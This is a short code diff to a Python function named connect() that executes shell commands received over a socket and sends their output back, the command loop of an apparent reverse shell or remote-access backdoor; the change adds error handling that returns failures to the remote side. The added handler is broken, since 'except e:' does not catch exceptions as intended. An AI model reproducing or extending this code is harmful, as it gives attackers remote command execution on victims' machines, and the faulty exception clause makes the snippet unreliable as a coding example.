@@ -48,9 +48,12 @@ def connect():
 				command.split(' ')[1]
 			)
 		else:
-			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-			s.send( CMD.stdout.read() ) 
-			s.send( CMD.stderr.read() )
+			try:
+				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+				s.send( CMD.stdout.read() ) 
+				s.send( CMD.stderr.read() )
+			except e:
+				s.send('[ERROR] {}'.format(e).encode())
 
 	return
 # ======================================================== #
